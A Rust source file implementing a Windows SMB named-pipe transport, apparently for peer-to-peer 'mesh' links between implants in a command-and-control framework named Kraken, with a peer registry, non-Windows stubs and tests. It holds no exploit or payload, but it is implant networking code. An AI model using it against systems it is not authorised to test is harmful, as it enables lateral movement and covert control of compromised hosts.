//! SMB Named Pipe transport for mesh peer-to-peer links (Windows only).
//!
//! Provides:
//! - `SmbConnection` — wraps a Windows named pipe HANDLE for framed I/O.
//! - `connect()` — opens a named pipe to a remote peer.
//! - Implements the `Transport` trait for handshake compatibility.
//!
//! On non-Windows platforms, all functions return `KrakenError::Transport`.

use common::KrakenError;

#[cfg(windows)]
mod windows_impl {
    use super::*;
    use crate::handshake::Transport;
    use std::collections::HashMap;
    use std::sync::{Arc, OnceLock, RwLock};

    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, ReadFile, WriteFile, FILE_FLAG_OVERLAPPED, FILE_SHARE_NONE, OPEN_EXISTING,
        PIPE_ACCESS_DUPLEX,
    };
    use windows_sys::Win32::System::Pipes::{
        SetNamedPipeHandleState, PIPE_READMODE_MESSAGE, PIPE_TYPE_MESSAGE, PIPE_WAIT,
        CreateNamedPipeW, ConnectNamedPipe,
    };

    use common::ImplantId;

    // ---------------------------------------------------------------------------
    // Static connection registry
    // ---------------------------------------------------------------------------

    static CONNECTIONS: OnceLock<RwLock<HashMap<ImplantId, SmbConnection>>> = OnceLock::new();

    fn connections() -> &'static RwLock<HashMap<ImplantId, SmbConnection>> {
        CONNECTIONS.get_or_init(|| RwLock::new(HashMap::new()))
    }

    // ---------------------------------------------------------------------------
    // SmbConnection
    // ---------------------------------------------------------------------------

    /// A named pipe connection that uses message mode for framed I/O.
    pub struct SmbConnection {
        handle: HANDLE,
    }

    // HANDLE can be sent between threads safely
    unsafe impl Send for SmbConnection {}

    impl SmbConnection {
        /// Create from an existing pipe handle.
        pub fn from_handle(handle: HANDLE) -> Self {
            Self { handle }
        }

        /// Send a message over the named pipe.
        pub fn send(&mut self, data: &[u8]) -> Result<(), KrakenError> {
            unsafe {
                let mut bytes_written: u32 = 0;
                let result = WriteFile(
                    self.handle,
                    data.as_ptr(),
                    data.len() as u32,
                    &mut bytes_written,
                    std::ptr::null_mut(),
                );

                if result == 0 {
                    return Err(KrakenError::Transport("pipe write failed".into()));
                }

                if bytes_written as usize != data.len() {
                    return Err(KrakenError::Transport("incomplete pipe write".into()));
                }

                Ok(())
            }
        }

        /// Receive a message from the named pipe.
        pub fn recv(&mut self) -> Result<Vec<u8>, KrakenError> {
            let mut buffer = vec![0u8; 65536];

            unsafe {
                let mut bytes_read: u32 = 0;
                let result = ReadFile(
                    self.handle,
                    buffer.as_mut_ptr(),
                    buffer.len() as u32,
                    &mut bytes_read,
                    std::ptr::null_mut(),
                );

                if result == 0 {
                    return Err(KrakenError::Transport("pipe read failed".into()));
                }

                buffer.truncate(bytes_read as usize);
                Ok(buffer)
            }
        }
    }

    impl Transport for SmbConnection {
        fn send(&mut self, data: &[u8]) -> Result<(), KrakenError> {
            SmbConnection::send(self, data)
        }

        fn recv(&mut self) -> Result<Vec<u8>, KrakenError> {
            SmbConnection::recv(self)
        }
    }

    impl Drop for SmbConnection {
        fn drop(&mut self) {
            unsafe {
                CloseHandle(self.handle);
            }
        }
    }

    // ---------------------------------------------------------------------------
    // Module-level connection helpers
    // ---------------------------------------------------------------------------

    /// Connect to a named pipe on a remote host.
    ///
    /// # Arguments
    /// * `address` - The hostname or IP address (e.g., "192.168.1.10" or ".")
    /// * `pipe_name` - The pipe name without the path prefix (e.g., "kraken-mesh")
    ///
    /// The full UNC path will be: `\\<address>\pipe\<pipe_name>`
    pub fn connect(address: &str, pipe_name: &str) -> Result<SmbConnection, KrakenError> {
        // Build UNC path as wide string
        let path = format!(r"\\{}\pipe\{}", address, pipe_name);
        let wide_path: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();

        unsafe {
            // Open the named pipe
            let handle = CreateFileW(
                wide_path.as_ptr(),
                0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
                FILE_SHARE_NONE,
                std::ptr::null(),
                OPEN_EXISTING,
                FILE_FLAG_OVERLAPPED,
                0,
            );

            if handle == INVALID_HANDLE_VALUE {
                return Err(KrakenError::Transport(format!(
                    "failed to connect to pipe: {}",
                    path
                )));
            }

            // Set to message mode
            let mut mode: u32 = PIPE_READMODE_MESSAGE;
            let set_result = SetNamedPipeHandleState(
                handle,
                &mut mode,
                std::ptr::null_mut(),
                std::ptr::null_mut(),
            );

            if set_result == 0 {
                CloseHandle(handle);
                return Err(KrakenError::Transport(
                    "failed to set pipe to message mode".into(),
                ));
            }

            Ok(SmbConnection { handle })
        }
    }

    /// Store a connection in the module-level registry.
    pub fn register(peer_id: ImplantId, conn: SmbConnection) {
        if let Ok(mut map) = connections().write() {
            map.insert(peer_id, conn);
        }
    }

    /// Send data to a previously registered peer.
    pub fn send(peer_id: ImplantId, data: &[u8]) -> Result<(), KrakenError> {
        let mut map = connections()
            .write()
            .map_err(|_| KrakenError::Transport("connections lock poisoned".into()))?;

        match map.get_mut(&peer_id) {
            Some(conn) => conn.send(data),
            None => Err(KrakenError::Transport(format!(
                "no SMB connection for peer {}",
                peer_id
            ))),
        }
    }

    /// Remove and drop the connection for a peer.
    pub fn disconnect(peer_id: ImplantId) {
        if let Ok(mut map) = connections().write() {
            map.remove(&peer_id);
        }
    }

    /// Check whether a connection to `peer_id` is currently registered.
    pub fn is_connected(peer_id: &ImplantId) -> bool {
        connections()
            .read()
            .map(|map| map.contains_key(peer_id))
            .unwrap_or(false)
    }

    /// List all currently connected peer IDs.
    pub fn list_peers() -> Vec<ImplantId> {
        connections()
            .read()
            .map(|map| map.keys().copied().collect())
            .unwrap_or_default()
    }

    // ---------------------------------------------------------------------------
    // SmbServer - Named Pipe Listener
    // ---------------------------------------------------------------------------

    /// Named pipe server for accepting incoming mesh connections.
    pub struct SmbServer {
        pipe_path: Vec<u16>,
        pipe_name: String,
    }

    impl SmbServer {
        /// Create a named pipe server.
        ///
        /// # Arguments
        /// * `pipe_name` - The pipe name (e.g., "kraken-mesh")
        ///
        /// The full pipe path will be: `\\.\pipe\<pipe_name>`
        pub fn bind(pipe_name: &str) -> Result<Self, KrakenError> {
            let path = format!(r"\\.\pipe\{}", pipe_name);
            let wide_path: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();

            Ok(Self {
                pipe_path: wide_path,
                pipe_name: pipe_name.to_string(),
            })
        }

        /// Accept an incoming connection.
        ///
        /// This creates a new pipe instance and waits for a client to connect.
        /// Returns an SmbConnection when a client connects.
        pub fn accept(&self) -> Result<SmbConnection, KrakenError> {
            unsafe {
                // Create a new pipe instance
                let handle = CreateNamedPipeW(
                    self.pipe_path.as_ptr(),
                    PIPE_ACCESS_DUPLEX,
                    PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                    255,           // Max instances
                    65536,         // Out buffer size
                    65536,         // In buffer size
                    0,             // Default timeout
                    std::ptr::null(), // Default security
                );

                if handle == INVALID_HANDLE_VALUE {
                    return Err(KrakenError::Transport(format!(
                        "CreateNamedPipe failed for {}",
                        self.pipe_name
                    )));
                }

                // Wait for a client to connect
                let connected = ConnectNamedPipe(handle, std::ptr::null_mut());

                // ConnectNamedPipe returns 0 on success if client already connected
                // or non-zero if we need to wait
                if connected == 0 {
                    let error = windows_sys::Win32::Foundation::GetLastError();
                    // ERROR_PIPE_CONNECTED (535) means client already connected - that's OK
                    if error != 535 {
                        CloseHandle(handle);
                        return Err(KrakenError::Transport(format!(
                            "ConnectNamedPipe failed: error {}",
                            error
                        )));
                    }
                }

                Ok(SmbConnection { handle })
            }
        }

        /// Get the pipe name
        pub fn pipe_name(&self) -> &str {
            &self.pipe_name
        }
    }
}

// ---------------------------------------------------------------------------
// Non-Windows stubs
// ---------------------------------------------------------------------------

#[cfg(not(windows))]
mod stub_impl {
    use super::*;
    use crate::handshake::Transport;
    use common::ImplantId;

    /// Stub SMB connection for non-Windows platforms.
    pub struct SmbConnection {
        _private: (),
    }

    impl SmbConnection {
        /// Send is not supported on non-Windows.
        pub fn send(&mut self, _data: &[u8]) -> Result<(), KrakenError> {
            Err(KrakenError::Transport("SMB only supported on Windows".into()))
        }

        /// Recv is not supported on non-Windows.
        pub fn recv(&mut self) -> Result<Vec<u8>, KrakenError> {
            Err(KrakenError::Transport("SMB only supported on Windows".into()))
        }
    }

    impl Transport for SmbConnection {
        fn send(&mut self, _data: &[u8]) -> Result<(), KrakenError> {
            Err(KrakenError::Transport("SMB only supported on Windows".into()))
        }

        fn recv(&mut self) -> Result<Vec<u8>, KrakenError> {
            Err(KrakenError::Transport("SMB only supported on Windows".into()))
        }
    }

    /// Connect is not supported on non-Windows.
    pub fn connect(_address: &str, _pipe_name: &str) -> Result<SmbConnection, KrakenError> {
        Err(KrakenError::Transport("SMB only supported on Windows".into()))
    }

    /// Register is not supported on non-Windows.
    pub fn register(_peer_id: ImplantId, _conn: SmbConnection) {
        // No-op on non-Windows
    }

    /// Send is not supported on non-Windows.
    pub fn send(_peer_id: ImplantId, _data: &[u8]) -> Result<(), KrakenError> {
        Err(KrakenError::Transport("SMB only supported on Windows".into()))
    }

    /// Disconnect is a no-op on non-Windows.
    pub fn disconnect(_peer_id: ImplantId) {
        // No-op on non-Windows
    }

    /// Always returns false on non-Windows.
    pub fn is_connected(_peer_id: &ImplantId) -> bool {
        false
    }

    /// Always returns empty on non-Windows.
    pub fn list_peers() -> Vec<ImplantId> {
        Vec::new()
    }

    /// Stub SMB server for non-Windows platforms.
    pub struct SmbServer {
        _private: (),
    }

    impl SmbServer {
        /// Bind is not supported on non-Windows.
        pub fn bind(_pipe_name: &str) -> Result<Self, KrakenError> {
            Err(KrakenError::Transport("SMB only supported on Windows".into()))
        }

        /// Accept is not supported on non-Windows.
        pub fn accept(&self) -> Result<SmbConnection, KrakenError> {
            Err(KrakenError::Transport("SMB only supported on Windows".into()))
        }

        /// Get the pipe name (stub).
        pub fn pipe_name(&self) -> &str {
            ""
        }
    }
}

// Re-export the appropriate implementation
#[cfg(windows)]
pub use windows_impl::*;

#[cfg(not(windows))]
pub use stub_impl::*;

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_stub_connect_returns_error() {
        let result = connect("localhost", "test-pipe");
        assert!(result.is_err());
        if let Err(KrakenError::Transport(msg)) = result {
            assert!(msg.contains("Windows"));
        } else {
            panic!("expected Transport error");
        }
    }

    #[test]
    #[cfg(not(windows))]
    fn test_stub_send_returns_error() {
        use common::ImplantId;
        let id = ImplantId::default();
        let result = send(id, b"test");
        assert!(result.is_err());
    }

    #[test]
    #[cfg(not(windows))]
    fn test_stub_is_connected_returns_false() {
        use common::ImplantId;
        let id = ImplantId::default();
        assert!(!is_connected(&id));
    }

    /// Verify that SmbServer::bind() constructs the server struct without error
    /// and that pipe_name() reflects the name that was passed in.
    #[test]
    #[cfg(windows)]
    fn test_smb_server_bind() {
        let pipe_name = "kraken-test-smb-server-bind";
        let server = SmbServer::bind(pipe_name).expect("SmbServer::bind should succeed");
        assert_eq!(server.pipe_name(), pipe_name);
    }

    /// Spin up a server on a named pipe, connect a client from a background thread,
    /// then send a message from client to server and verify the server receives it.
    #[test]
    #[cfg(windows)]
    fn test_smb_connection_send_recv() {
        use std::thread;

        let pipe_name = "kraken-test-smb-send-recv";

        // Bind server before spawning the client thread so the pipe path exists
        // when CreateFileW is called.
        let server = SmbServer::bind(pipe_name).expect("SmbServer::bind failed");

        // Client thread: connect and send one message.
        let pipe_name_clone = pipe_name.to_string();
        let client_thread = thread::spawn(move || -> Result<(), KrakenError> {
            let mut client = connect(".", &pipe_name_clone)?;
            client.send(b"hello from client")?;
            Ok(())
        });

        // Server side: accept blocks until the client connects.
        let mut server_conn = server.accept().expect("server accept failed");
        let received = server_conn.recv().expect("server recv failed");

        assert_eq!(received, b"hello from client");

        client_thread.join().expect("client thread panicked")
            .expect("client thread returned an error");
    }

    /// Full mesh handshake over a real SMB named pipe, followed by encrypted
    /// message exchange to verify both sides derive the same session key.
    #[test]
    #[cfg(windows)]
    fn test_smb_mesh_handshake() {
        use crate::{EncryptedConnection, initiate_handshake, respond_handshake};
        use std::thread;

        let pipe_name = "kraken-test-smb-mesh-handshake";

        // Generate ephemeral keypairs for both sides.
        let client_kp = crypto::generate_keypair().expect("client keypair");
        let server_kp = crypto::generate_keypair().expect("server keypair");

        // Clone server keypair bytes so they can be moved into the server thread.
        let server_kp_clone = (
            crypto::X25519PublicKey::from_bytes(server_kp.0.as_bytes())
                .expect("server pub clone"),
            crypto::X25519PrivateKey::from_bytes(server_kp.1.as_bytes())
                .expect("server priv clone"),
        );

        // Bind the server before spawning the client so the pipe exists when
        // CreateFileW runs.
        let server = SmbServer::bind(pipe_name).expect("SmbServer::bind failed");

        // Server thread: accept one connection, run responder handshake, then
        // exchange one encrypted round-trip message.
        let server_thread = thread::spawn(move || -> (Vec<u8>, Vec<u8>) {
            let mut conn = server.accept().expect("server accept failed");

            let result = respond_handshake(&mut conn, &server_kp_clone)
                .expect("server respond_handshake failed");

            let session_key_bytes = result.session_key.as_bytes().to_vec();

            // Wrap in EncryptedConnection (responder side).
            let session_key = crypto::SymmetricKey::from_bytes(&session_key_bytes)
                .expect("server SymmetricKey");
            let mut enc = EncryptedConnection::new(conn, session_key, false);

            // Receive the client's message and send a reply.
            let received = enc.recv_encrypted().expect("server recv_encrypted failed");
            enc.send_encrypted(b"pong").expect("server send_encrypted failed");

            (session_key_bytes, received)
        });

        // Client side: connect, run initiator handshake, exchange messages.
        let mut conn = connect(".", pipe_name).expect("client connect failed");

        let result = initiate_handshake(&mut conn, &client_kp, None)
            .expect("client initiate_handshake failed");

        let client_session_key_bytes = result.session_key.as_bytes().to_vec();

        let session_key = crypto::SymmetricKey::from_bytes(&client_session_key_bytes)
            .expect("client SymmetricKey");
        let mut enc = EncryptedConnection::new(conn, session_key, true);

        enc.send_encrypted(b"ping").expect("client send_encrypted failed");
        let reply = enc.recv_encrypted().expect("client recv_encrypted failed");

        // Collect server results.
        let (server_session_key_bytes, server_received) =
            server_thread.join().expect("server thread panicked");

        // Both sides must derive the same session key.
        assert_eq!(
            client_session_key_bytes, server_session_key_bytes,
            "client and server must derive identical session keys"
        );

        // Verify the encrypted messages were received correctly.
        assert_eq!(server_received, b"ping", "server must receive client's ping");
        assert_eq!(reply, b"pong", "client must receive server's pong");
    }

    /// Exercise the module-level peer registry: register, list_peers,
    /// is_connected, and disconnect.
    #[test]
    #[cfg(windows)]
    fn test_smb_register_and_list_peers() {
        use std::thread;
        use common::ImplantId;

        // Use fixed, distinct IDs so this test is deterministic and does not
        // collide with other tests that touch the static registry.
        let peer_a = ImplantId([0xAA; 16]);
        let peer_b = ImplantId([0xBB; 16]);

        let pipe_a = "kraken-test-registry-peer-a";
        let pipe_b = "kraken-test-registry-peer-b";

        // Helper: create a live pipe connection pair and return the server-side handle.
        // The client end is dropped immediately; we only need the server handle in the
        // registry for this test.
        fn make_server_conn(pipe_name: &str) -> SmbConnection {
            let server = SmbServer::bind(pipe_name).expect("bind failed");
            let pipe_name = pipe_name.to_string();
            let t = thread::spawn(move || {
                // Connect then drop immediately – we just need the pipe open.
                connect(".", &pipe_name).expect("connect failed")
            });
            let conn = server.accept().expect("accept failed");
            let _client = t.join().expect("client thread panicked");
            conn
        }

        let conn_a = make_server_conn(pipe_a);
        let conn_b = make_server_conn(pipe_b);

        // Before registration neither peer should appear.
        assert!(!is_connected(&peer_a), "peer_a should not be registered yet");
        assert!(!is_connected(&peer_b), "peer_b should not be registered yet");

        register(peer_a, conn_a);
        register(peer_b, conn_b);

        assert!(is_connected(&peer_a), "peer_a should be connected after register");
        assert!(is_connected(&peer_b), "peer_b should be connected after register");

        let peers = list_peers();
        assert!(peers.contains(&peer_a), "list_peers should include peer_a");
        assert!(peers.contains(&peer_b), "list_peers should include peer_b");

        disconnect(peer_a);

        assert!(!is_connected(&peer_a), "peer_a should be gone after disconnect");
        assert!(is_connected(&peer_b), "peer_b should still be connected");

        // Clean up.
        disconnect(peer_b);
    }

    /// Stress test with 10 concurrent pipe connections.
    ///
    /// Spawns 10 client threads that all connect to the same named pipe server
    /// simultaneously. Each client sends a unique message; the server echoes it
    /// back. Verifies that no connections are dropped or corrupted under load.
    #[test]
    #[cfg(windows)]
    fn test_smb_concurrent_connections() {
        use std::sync::{Arc, Barrier};
        use std::thread;

        const NUM_CLIENTS: usize = 10;

        let pipe_name = format!("test-smb-stress-{}", std::process::id());

        // A barrier ensures all client threads attempt to connect at the same
        // instant, maximising contention on the accept loop.
        let barrier = Arc::new(Barrier::new(NUM_CLIENTS));

        let mut client_handles = Vec::with_capacity(NUM_CLIENTS);
        for i in 0..NUM_CLIENTS {
            let pn = pipe_name.clone();
            let b = Arc::clone(&barrier);
            client_handles.push(thread::spawn(move || -> Result<Vec<u8>, String> {
                b.wait();
                let mut client = connect(".", &pn)
                    .map_err(|e| format!("client {} connect failed: {:?}", i, e))?;
                let msg = format!("message-from-client-{}", i);
                client
                    .send(msg.as_bytes())
                    .map_err(|e| format!("client {} send failed: {:?}", i, e))?;
                let reply = client
                    .recv()
                    .map_err(|e| format!("client {} recv failed: {:?}", i, e))?;
                Ok(reply)
            }));
        }

        // Server accept loop: create a pipe instance per client and echo each
        // message back. The pipe supports up to 255 instances so all 10 are
        // serviced without blocking each other at the OS level.
        let server = SmbServer::bind(&pipe_name).expect("SmbServer::bind failed");
        let mut server_errors: Vec<String> = Vec::new();
        for i in 0..NUM_CLIENTS {
            match server.accept() {
                Ok(mut conn) => match conn.recv() {
                    Ok(data) => {
                        if let Err(e) = conn.send(&data) {
                            server_errors
                                .push(format!("server echo send {} failed: {:?}", i, e));
                        }
                    }
                    Err(e) => {
                        server_errors.push(format!("server recv {} failed: {:?}", i, e));
                    }
                },
                Err(e) => {
                    server_errors.push(format!("server accept {} failed: {:?}", i, e));
                }
            }
        }

        assert!(
            server_errors.is_empty(),
            "server errors: {:?}",
            server_errors
        );

        for (i, handle) in client_handles.into_iter().enumerate() {
            let result = handle
                .join()
                .unwrap_or_else(|_| Err(format!("client {} thread panicked", i)));
            match result {
                Ok(reply) => {
                    let reply_str =
                        String::from_utf8(reply).unwrap_or_else(|_| "<invalid utf8>".to_string());
                    assert!(
                        reply_str.starts_with("message-from-client-"),
                        "unexpected reply from client {}: {}",
                        i,
                        reply_str
                    );
                }
                Err(e) => panic!("client {} failed: {}", i, e),
            }
        }
    }

    /// Test that messages maintain order per connection under concurrent load.
    ///
    /// Each of several clients sends a sequence of numbered messages over its
    /// own dedicated connection. The server echoes every message back. After
    /// all exchanges complete the test verifies that each client received its
    /// replies in the same order they were sent, proving per-connection
    /// ordering is preserved even when multiple connections are active at once.
    #[test]
    #[cfg(windows)]
    fn test_smb_message_ordering() {
        use std::thread;

        const NUM_CLIENTS: usize = 5;
        const MESSAGES_PER_CLIENT: usize = 20;

        let pipe_name = format!("test-smb-stress-{}-ord", std::process::id());

        // Spawn clients before the accept loop so they queue up immediately.
        let mut client_handles = Vec::with_capacity(NUM_CLIENTS);
        for client_id in 0..NUM_CLIENTS {
            let pn = pipe_name.clone();
            client_handles.push(thread::spawn(move || -> Result<Vec<String>, String> {
                let mut conn = connect(".", &pn)
                    .map_err(|e| format!("client {} connect: {:?}", client_id, e))?;
                let mut received = Vec::with_capacity(MESSAGES_PER_CLIENT);
                for seq in 0..MESSAGES_PER_CLIENT {
                    let msg = format!("c{}m{}", client_id, seq);
                    conn.send(msg.as_bytes())
                        .map_err(|e| format!("client {} send {}: {:?}", client_id, seq, e))?;
                    let reply = conn
                        .recv()
                        .map_err(|e| format!("client {} recv {}: {:?}", client_id, seq, e))?;
                    received.push(
                        String::from_utf8(reply).unwrap_or_else(|_| "<bad utf8>".to_string()),
                    );
                }
                Ok(received)
            }));
        }

        // Server: accept each client and echo all MESSAGES_PER_CLIENT messages
        // before moving to the next connection. Sequential per-connection
        // processing means each client's messages are handled in strict order.
        let server = SmbServer::bind(&pipe_name).expect("SmbServer::bind failed");
        for _ in 0..NUM_CLIENTS {
            let mut conn = server.accept().expect("server accept failed");
            for _ in 0..MESSAGES_PER_CLIENT {
                let data = conn.recv().expect("server recv failed");
                conn.send(&data).expect("server echo send failed");
            }
        }

        // Verify per-connection ordering: client N must receive replies
        // "cNm0", "cNm1", … "cNm{MESSAGES_PER_CLIENT-1}" in that exact order.
        for (client_id, handle) in client_handles.into_iter().enumerate() {
            let replies = handle
                .join()
                .unwrap_or_else(|_| Err(format!("client {} panicked", client_id)))
                .unwrap_or_else(|e| panic!("client {} error: {}", client_id, e));

            assert_eq!(
                replies.len(),
                MESSAGES_PER_CLIENT,
                "client {} received wrong number of replies",
                client_id
            );

            for (seq, reply) in replies.iter().enumerate() {
                let expected = format!("c{}m{}", client_id, seq);
                assert_eq!(
                    reply, &expected,
                    "client {} message {} out of order: got '{}', want '{}'",
                    client_id, seq, reply, expected
                );
            }
        }
    }
}
